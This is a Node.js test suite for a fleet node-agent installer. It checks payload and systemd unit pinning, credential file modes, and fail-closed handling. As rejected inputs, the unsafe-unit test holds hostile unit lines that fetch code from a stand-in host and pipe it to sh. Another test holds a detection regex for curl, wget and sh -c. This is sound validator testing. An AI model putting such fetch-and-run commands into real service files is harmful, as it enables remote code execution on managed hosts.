import test from "node:test";
import assert from "node:assert/strict";
import { readFile, writeFile, rm, stat } from "node:fs/promises";
import { dirname, join } from "node:path";
import { fileURLToPath } from "node:url";

import {
  AGENT_CONFIG_HOME,
  AGENT_PAYLOAD_ARTIFACT,
  AGENT_PAYLOAD_LITERAL,
  AGENT_UNIT_NAME,
  CONTROL_ACCOUNT,
  LINGER,
  NODE_JSON_PATH,
  NODE_TOKEN_PATH,
  PAYLOAD_PATH,
  REAL_AGENT_PAYLOAD_PATH,
  UNIT_PATH,
  WANT_PATH,
  buildSelection,
  calls,
  exists,
  freshCheckpoint,
  linuxOnly,
  makeHost,
  readFixture,
  readJson,
  resetProviderIdentity,
  runCourier,
  sha256,
  setClaim,
} from "./support/capability-fixture.js";
import {
  AGENT_CONFIG_PATH,
  AGENT_PAYLOAD_MODE,
  AGENT_PAYLOAD_PATH,
  AGENT_USER_UNIT_NAME,
  CAPABILITY_BLOCK_BEGIN,
  CAPABILITY_BLOCK_END,
  SELECTED_CAPABILITY_SCHEMA,
  capabilitySelectionDigest,
  decodeCapabilitySelection,
  encodeCapabilitySelection,
  normalizeSelectedCapability,
  renderBootstrap,
} from "../src/index.js";

const here = dirname(fileURLToPath(import.meta.url));
const assetsDir = join(here, "..", "assets");
const fixturesDir = join(here, "fixtures");

function blockOf(script) {
  const start = script.indexOf(CAPABILITY_BLOCK_BEGIN);
  const end = script.indexOf(CAPABILITY_BLOCK_END);
  assert.ok(start > 0 && end > start, "the capability block must be rendered exactly once");
  return script.slice(start, end);
}

function withUnit(selection, patch) {
  return { ...selection, user_unit: { ...selection.user_unit, ...patch } };
}

test("the agent contract constants stay the documented production values", () => {
  assert.equal(AGENT_PAYLOAD_PATH, "/usr/local/libexec/ghostfleet/node-agent.pyz");
  assert.equal(AGENT_PAYLOAD_MODE, "0755");
  assert.equal(AGENT_USER_UNIT_NAME, "ghostfleet-managed.service");
  assert.equal(AGENT_CONFIG_PATH, "/etc/ghostfleet/node-agent.json");
  assert.equal(SELECTED_CAPABILITY_SCHEMA, "ghostfleet-selected-capability/v2");
});

test("the managed user unit requires two independently pinned artifacts", async () => {
  const base = await buildSelection();
  const normalized = normalizeSelectedCapability(base);
  assert.equal(normalized.user_unit.payload_artifact, AGENT_PAYLOAD_ARTIFACT);
  assert.equal(normalized.user_unit.payload_path, AGENT_PAYLOAD_PATH);
  assert.equal(normalized.user_unit.payload_mode, "0755");

  assert.throws(
    () => normalizeSelectedCapability(withUnit(base, { payload_artifact: undefined })),
    /CAPABILITY_MANAGED_ARTIFACTS_INCOMPLETE/,
  );
  assert.throws(
    () => normalizeSelectedCapability(withUnit(base, { payload_artifact: "unpinned.pyz" })),
    /CAPABILITY_MANAGED_ARTIFACTS_INCOMPLETE/,
  );
  assert.throws(
    () => normalizeSelectedCapability(withUnit(base, { payload_artifact: AGENT_UNIT_NAME })),
    /CAPABILITY_USER_UNIT_PAYLOAD_INVALID/,
  );
  assert.throws(
    () => normalizeSelectedCapability(withUnit(base, { payload_path: "/opt/ghostfleet/node-agent.pyz" })),
    /CAPABILITY_USER_UNIT_PAYLOAD_INVALID/,
  );
  assert.throws(
    () => normalizeSelectedCapability(withUnit(base, { payload_mode: "0644" })),
    /CAPABILITY_USER_UNIT_PAYLOAD_INVALID/,
  );
  assert.throws(
    () => normalizeSelectedCapability({
      ...base,
      artifacts: base.artifacts.map((artifact) =>
        artifact.name === AGENT_PAYLOAD_ARTIFACT ? { ...artifact, mode: "0644" } : artifact),
    }),
    /CAPABILITY_USER_UNIT_PAYLOAD_INVALID/,
  );
  assert.throws(
    () => normalizeSelectedCapability({ ...base, linger_required: false }),
    /CAPABILITY_USER_SERVICE_REQUIRES_LINGER/,
  );
});

test("an unsafe user unit is refused before any byte is rendered", async () => {
  const defaultUnit = await readFile(join(fixturesDir, "ghostfleet-node-agent.service"), "utf8");
  const unsafe = [
    defaultUnit.replace(/^ExecStart=.*$/m, "ExecStart=/usr/bin/python3 -I " + AGENT_PAYLOAD_LITERAL + " run --config /tmp/agent.json"),
    defaultUnit.replace(/^ExecStart=.*$/m, "ExecStart=/bin/sh -c 'curl -fsS https://example.invalid | sh'"),
    defaultUnit.replace(/^ExecStart=.*$/m, "ExecStart=/bin/curl https://example.invalid"),
    defaultUnit.replace(/^StateDirectory=.*$/m, "").replace(/^ConfigurationDirectory=.*$/m, ""),
    defaultUnit.replace(/^ReadWritePaths=.*$/m, "ReadWritePaths=/var/lib/fleet"),
  ];
  for (const unitContent of unsafe) {
    const selection = await buildSelection({ unitContent });
    assert.throws(() => normalizeSelectedCapability(selection), /CAPABILITY_USER_UNIT_UNSAFE/);
    assert.throws(
      () => renderBootstrap({ brokerOrigin: "https://broker.fixture.invalid", capabilitySelection: selection }),
      /CAPABILITY_USER_UNIT_UNSAFE/,
    );
  }
});

test("encode, decode, digest and render keep the payload contract in sync", async () => {
  const normalized = normalizeSelectedCapability(await buildSelection());
  const text = Buffer.from(encodeCapabilitySelection(normalized), "base64").toString("utf8");
  assert.match(text, /^user_unit_payload_artifact=node-agent\.pyz$/m);
  assert.match(text, /^user_unit_payload_path=\/usr\/local\/libexec\/ghostfleet\/node-agent\.pyz$/m);
  assert.match(text, /^user_unit_payload_mode=0755$/m);
  assert.deepEqual(decodeCapabilitySelection(text).user_unit, normalized.user_unit);

  const block = blockOf(renderBootstrap({ brokerOrigin: "https://broker.fixture.invalid", capabilitySelection: await buildSelection() }));
  assert.match(block, /^CAPABILITY_USER_UNIT_PAYLOAD_ARTIFACT='node-agent\.pyz'$/m);
  assert.match(block, /^CAPABILITY_USER_UNIT_PAYLOAD_PATH='\/usr\/local\/libexec\/ghostfleet\/node-agent\.pyz'$/m);
  assert.match(block, /^CAPABILITY_USER_UNIT_PAYLOAD_MODE='0755'$/m);
  assert.doesNotMatch(block, /[A-Za-z0-9+/]{120,}={0,2}/);

  const digest = capabilitySelectionDigest(normalized);
  assert.match(digest, /^sha256:[0-9a-f]{64}$/);
  const baseline = await buildSelection();
  const reordered = normalizeSelectedCapability({ ...baseline, artifacts: [...baseline.artifacts].reverse() });
  assert.equal(capabilitySelectionDigest(reordered), digest);
  const relocated = normalizeSelectedCapability(await buildSelection({
    payloadPath: "/srv/libexec/ghostfleet/node-agent.pyz",
  }));
  assert.notEqual(capabilitySelectionDigest(relocated), digest);
});

test("the release unit asset pins the exact production launcher and passes the validator", async () => {
  const asset = await readFile(join(assetsDir, "ghostfleet-managed.service"), "utf8");
  const execLines = asset.split("\n").filter((line) => line.startsWith("Exec"));
  assert.deepEqual(execLines, ["ExecStart=/usr/bin/python3 -I " + AGENT_PAYLOAD_LITERAL + " run"]);
  assert.match(asset, /^Type=notify$/m);
  assert.match(asset, /^NotifyAccess=main$/m);
  assert.match(asset, /^WatchdogSec=60$/m);
  assert.match(asset, /^ProtectSystem=strict$/m);
  assert.match(asset, /^ProtectHome=read-only$/m);
  assert.match(asset, /^StateDirectory=ghostfleet-agent$/m);
  assert.match(asset, /^ConfigurationDirectory=ghostfleet$/m);
  assert.match(asset, /^ReadWritePaths=%h\/\.config\/ghostfleet %h\/\.local\/state\/ghostfleet-agent$/m);
  assert.doesNotMatch(asset, /--config|\bsh -c\b|\/bin\/sh|\bcurl\b|\bwget\b/);
  const normalized = normalizeSelectedCapability(await buildSelection({ unitContent: asset }));
  assert.equal(normalized.user_unit.payload_path, AGENT_PAYLOAD_PATH);
});

test("the courier installs the pinned payload, unit, credential and public projection", { skip: linuxOnly }, async () => {
  const host = await makeHost();
  try {
    await freshCheckpoint(host);
    const selection = await host.buildSelection();
    await setClaim(host, { capability_required: true, capability_selection: encodeCapabilitySelection(selection) });
    const result = await runCourier(host, null);
    assert.equal(result.status, 0, result.stderr);

    const payloadSha = sha256(await readFile(PAYLOAD_PATH(host))).slice("sha256:".length);
    assert.equal((await stat(PAYLOAD_PATH(host))).mode & 0o777, 0o755);
    const unit = await readFile(UNIT_PATH(host), "utf8");
    assert.ok(unit.includes("ExecStart=/usr/bin/python3 -I " + host.payloadPath + " run\n"), unit);
    assert.equal(await readFile(WANT_PATH(host), "utf8"), unit);
    assert.ok(await exists(LINGER(host)));

    assert.equal((await stat(AGENT_CONFIG_HOME(host))).mode & 0o777, 0o700);
    assert.equal((await stat(NODE_TOKEN_PATH(host))).mode & 0o777, 0o600);
    const token = (await readFile(NODE_TOKEN_PATH(host), "utf8")).trim();
    assert.match(token, /^[A-Za-z0-9_-]{43}$/);
    const nodeJson = await readJson(NODE_JSON_PATH(host));
    assert.equal((await stat(NODE_JSON_PATH(host))).mode & 0o777, 0o600);
    assert.ok(nodeJson.node_uid);
    assert.match(nodeJson.platform, /^linux-/);

    const projectionPath = join(host.etcGhostfleet, "capability-status.json");
    const projection = await readJson(projectionPath);
    assert.equal((await stat(projectionPath)).mode & 0o777, 0o644);
    assert.equal(projection.schema, "ghostfleet-capability-status/v1");
    assert.equal(projection.selection_schema, SELECTED_CAPABILITY_SCHEMA);
    assert.equal(projection.release_pin, selection.template_digest.slice("sha256:".length, "sha256:".length + 40));
    assert.equal(projection.control_account, CONTROL_ACCOUNT);
    assert.equal(projection.artifacts.length, 5);
    assert.equal(projection.user_unit.payload_sha256, payloadSha);
    assert.equal(projection.user_unit.payload_path, host.payloadPath);
    assert.deepEqual(projection.artifacts.map((artifact) => artifact.kind).sort(), ["helper", "installer", "key", "payload", "unit"]);
    assert.equal(JSON.stringify(projection).includes(token), false);

    // The agent reads this root-owned file at startup, so it must be valid JSON
    // and must name exactly the unit this lane installed. A malformed body here
    // would make a converged node look UNKNOWN to the agent.
    const agentConfigPath = join(host.etcGhostfleet, "node-agent.json");
    const agentConfig = await readJson(agentConfigPath);
    assert.equal((await stat(agentConfigPath)).mode & 0o777, 0o644);
    assert.equal(agentConfig.schema, "ghostfleet-node-agent-config/v1");
    assert.match(agentConfig.control_plane_origin, /^https:\/\//);
    assert.ok(agentConfig.heartbeat_interval_s.lower < agentConfig.heartbeat_interval_s.upper);
    assert.deepEqual(agentConfig.allowed_units, [AGENT_USER_UNIT_NAME]);
    assert.equal(agentConfig.node_uid, nodeJson.node_uid);

    assert.match(result.stdout, /^capability_agent_payload_sha256=[0-9a-f]{64}$/m);
    assert.match(result.stdout, /^capability_agent_payload_path=\//m);
    assert.match(result.stdout, /^capability_agent_payload_state=INSTALLED$/m);
    assert.match(result.stdout, /^capability_agent_payload_owner=root:root$/m);
    assert.match(result.stdout, /^capability_agent_payload_mode=755$/m);
    assert.match(result.stdout, /^capability_user_unit_state=INSTALLED$/m);
    assert.match(result.stdout, /^capability_service_state=INSTALLED$/m);
    assert.match(result.stdout, /^capability_node_credential_received=yes$/m);
    assert.match(result.stdout, /^capability_node_token_mode=0?600$/m);
    assert.match(result.stdout, /^capability_node_token_type=regular$/m);
    assert.equal(result.stdout.includes(token), false);
    assert.equal(result.stderr.includes(token), false);
  } finally {
    await rm(host.root, { recursive: true, force: true });
  }
});

test("a repeat run keeps the payload and unit byte-identical", { skip: linuxOnly }, async () => {
  const host = await makeHost();
  try {
    await freshCheckpoint(host);
    const selection = await host.buildSelection();
    await setClaim(host, { capability_required: true, capability_selection: encodeCapabilitySelection(selection) });
    assert.equal((await runCourier(host, null)).status, 0);
    const payloadBefore = await readFile(PAYLOAD_PATH(host));
    const unitBefore = await readFile(UNIT_PATH(host), "utf8");
    await freshCheckpoint(host);
    await resetProviderIdentity(host);
    const result = await runCourier(host, null);
    assert.equal(result.status, 0, result.stderr);
    assert.deepEqual(await readFile(PAYLOAD_PATH(host)), payloadBefore);
    assert.equal(await readFile(UNIT_PATH(host), "utf8"), unitBefore);
    assert.match(result.stdout, /^capability_agent_payload_state=COMPLIANT$/m);
    assert.match(result.stdout, /^capability_user_unit_state=COMPLIANT$/m);
  } finally {
    await rm(host.root, { recursive: true, force: true });
  }
});

test("a drifted payload is replaced byte-exactly", { skip: linuxOnly }, async () => {
  const host = await makeHost();
  try {
    await freshCheckpoint(host);
    const selection = await host.buildSelection();
    await setClaim(host, { capability_required: true, capability_selection: encodeCapabilitySelection(selection) });
    assert.equal((await runCourier(host, null)).status, 0);
    await writeFile(PAYLOAD_PATH(host), "drifted payload\n", { mode: 0o755 });
    await freshCheckpoint(host);
    await resetProviderIdentity(host);
    const result = await runCourier(host, null);
    assert.equal(result.status, 0, result.stderr);
    assert.equal(
      sha256(await readFile(PAYLOAD_PATH(host))),
      sha256(await readFile(join(fixturesDir, AGENT_PAYLOAD_ARTIFACT))),
    );
    assert.match(result.stdout, /^capability_agent_payload_state=INSTALLED$/m);
  } finally {
    await rm(host.root, { recursive: true, force: true });
  }
});

test("a payload owned by another account is never chowned back into place", { skip: linuxOnly }, async () => {
  const host = await makeHost();
  try {
    await freshCheckpoint(host);
    const selection = await host.buildSelection();
    await setClaim(host, { capability_required: true, capability_selection: encodeCapabilitySelection(selection) });
    assert.equal((await runCourier(host, null)).status, 0);
    const markers = join(host.fixtureState, "stat-owner.tsv");
    await writeFile(markers, (await readFile(markers, "utf8")) + host.payloadPath + "|nobody:nogroup\n");
    await freshCheckpoint(host);
    await resetProviderIdentity(host);
    const result = await runCourier(host, null);
    assert.notEqual(result.status, 0);
    assert.match(result.stderr, /CAPABILITY_AGENT_PAYLOAD_OWNER_UNSAFE/);
    assert.equal((await calls(host)).filter((line) => line.startsWith("chown ") && line.includes(host.payloadPath)).length, 0);
  } finally {
    await rm(host.root, { recursive: true, force: true });
  }
});

test("an expired credential handoff fails closed before any service artifact exists", { skip: linuxOnly }, async () => {
  const host = await makeHost();
  try {
    await freshCheckpoint(host);
    const selection = await host.buildSelection();
    await setClaim(host, { capability_required: true, capability_selection: encodeCapabilitySelection(selection) });
    await writeFile(join(host.fixtureState, "complete-response.json"), JSON.stringify({ outcome: "COMPLETE", credential_handoff: "EXPIRED" }) + "\n");
    const result = await runCourier(host, null);
    assert.notEqual(result.status, 0);
    assert.match(result.stderr, /CAPABILITY_NODE_CREDENTIAL_EXPIRED/);
    assert.equal(await exists(PAYLOAD_PATH(host)), false);
    assert.equal(await exists(UNIT_PATH(host)), false);
    assert.equal(await exists(LINGER(host)), false);
    assert.equal(await exists(join(host.etcGhostfleet, "capability-status.json")), false);
    assert.equal(await exists(NODE_TOKEN_PATH(host)), false);
  } finally {
    await rm(host.root, { recursive: true, force: true });
  }
});

test("a completion response without the node credential installs no user service", { skip: linuxOnly }, async () => {
  const host = await makeHost();
  try {
    await freshCheckpoint(host);
    const selection = await host.buildSelection();
    await setClaim(host, { capability_required: true, capability_selection: encodeCapabilitySelection(selection) });
    await writeFile(join(host.fixtureState, "complete-response.json"), JSON.stringify({ outcome: "COMPLETE" }) + "\n");
    const result = await runCourier(host, null);
    assert.notEqual(result.status, 0);
    assert.match(result.stderr, /CAPABILITY_NODE_CREDENTIAL_MISSING/);
    assert.equal(await exists(PAYLOAD_PATH(host)), false);
    assert.equal(await exists(UNIT_PATH(host)), false);
    assert.equal(await exists(LINGER(host)), false);
  } finally {
    await rm(host.root, { recursive: true, force: true });
  }
});

test("a concurrent writer with a different token is refused instead of overwritten", { skip: linuxOnly }, async () => {
  const host = await makeHost();
  try {
    await freshCheckpoint(host);
    const selection = await host.buildSelection();
    await setClaim(host, { capability_required: true, capability_selection: encodeCapabilitySelection(selection) });
    const different = "fixture-second-token-" + "1".repeat(22);
    // Simulate another writer that stores a different credential while the courier
    // is still between the capability phase and the completion handoff.
    const result = await runCourier(host, null, {
      tamper: (script) => script.replace(
        "  capability_service_finish",
        '  install -d -m 0700 "' + AGENT_CONFIG_HOME(host) + '"\n' +
          '  printf %s "' + different + '" > "' + NODE_TOKEN_PATH(host) + '"\n' +
          '  chmod 600 "' + NODE_TOKEN_PATH(host) + '"\n' +
          '  printf \'%s\\n\' "' + NODE_TOKEN_PATH(host) + "|" + CONTROL_ACCOUNT + ":" + CONTROL_ACCOUNT + '" >> "' + join(host.fixtureState, "stat-owner.tsv") + '"\n' +
          "  capability_service_finish",
      ),
    });
    assert.notEqual(result.status, 0, result.stderr);
    assert.match(result.stderr, /CAPABILITY_NODE_CREDENTIAL_CONFLICT/);
    assert.equal((await readFile(NODE_TOKEN_PATH(host), "utf8")).trim(), different);
  } finally {
    await rm(host.root, { recursive: true, force: true });
  }
});

test("the release user unit passes systemd-analyze --user verify", { skip: linuxOnly }, async () => {
  const { execFile } = await import("node:child_process");
  const { promisify } = await import("node:util");
  const { mkdtemp, mkdir, copyFile, chmod } = await import("node:fs/promises");
  const { tmpdir } = await import("node:os");
  const run = promisify(execFile);
  const dir = await mkdtemp(join(tmpdir(), "ghostfleet-unit-verify-"));
  const unitFile = join(dir, AGENT_UNIT_NAME);
  try {
    await copyFile(join(assetsDir, "ghostfleet-managed.service"), unitFile);
    await chmod(unitFile, 0o644);
    // A --user invocation needs a private runtime directory. CI runs this as a
    // normal user with /run/user/<uid> present, but a root-owned container (the
    // disposable lane, or a WSL root shell) has none, so provide one explicitly.
    const runtimeDir = join(dir, "runtime");
    await mkdir(runtimeDir, { recursive: true, mode: 0o700 });
    const env = { ...process.env, XDG_RUNTIME_DIR: runtimeDir };
    let outcome = null;
    try {
      outcome = await run("systemd-analyze", ["--user", "verify", unitFile], { timeout: 60000, env });
    } catch (error) {
      // A missing systemd-analyze must fail loudly: the acceptance contract
      // requires this verification, so a silent skip would hide a broken unit.
      assert.fail("systemd-analyze --user verify failed for the release user unit: " + String(error.stderr || error.message));
    }
    assert.equal(typeof outcome.stdout, "string");
  } finally {
    await rm(dir, { recursive: true, force: true });
  }
});

test("the public projection never carries a credential", { skip: linuxOnly }, async () => {
  const host = await makeHost();
  try {
    await freshCheckpoint(host);
    const selection = await host.buildSelection();
    await setClaim(host, { capability_required: true, capability_selection: encodeCapabilitySelection(selection) });
    const result = await runCourier(host, null);
    assert.equal(result.status, 0, result.stderr);
    const token = (await readFile(NODE_TOKEN_PATH(host), "utf8")).trim();
    const state = await readFile(join(host.checkpoint, "capability-state.json"), "utf8");
    const projection = await readFile(join(host.etcGhostfleet, "capability-status.json"), "utf8");
    for (const text of [result.stdout, result.stderr, state, projection]) {
      assert.equal(text.includes(token), false);
      assert.equal(text.includes("handoff_id"), false);
    }
  } finally {
    await rm(host.root, { recursive: true, force: true });
  }
});

test("the fixture payload is synthetic and yields to a rebuilt agent artifact", async () => {
  const selection = await buildSelection();
  const payload = selection.artifacts.find((artifact) => artifact.name === AGENT_PAYLOAD_ARTIFACT);
  assert.ok(payload, "the selection must pin the agent payload");
  const readme = await readFile(join(fixturesDir, "README.md"), "utf8");
  assert.match(readme, /synthetic/i, "the fixture directory must state that its payload is synthetic");
  if (await exists(REAL_AGENT_PAYLOAD_PATH)) {
    // An integration checkout carries the frozen payload; the same tests must
    // exercise those exact bytes instead of the synthetic stand-in.
    const rebuilt = await readFile(REAL_AGENT_PAYLOAD_PATH);
    assert.ok(Buffer.isBuffer(payload.content), "a real payload is binary");
    assert.equal(Buffer.compare(payload.content, rebuilt), 0);
  } else {
    const synthetic = await readFixture(AGENT_PAYLOAD_ARTIFACT);
    assert.equal(payload.content, synthetic);
    assert.match(synthetic, /synthetic/i, "the fixture payload must label itself as synthetic");
    assert.equal(readme.includes("not the product agent"), true);
  }
});
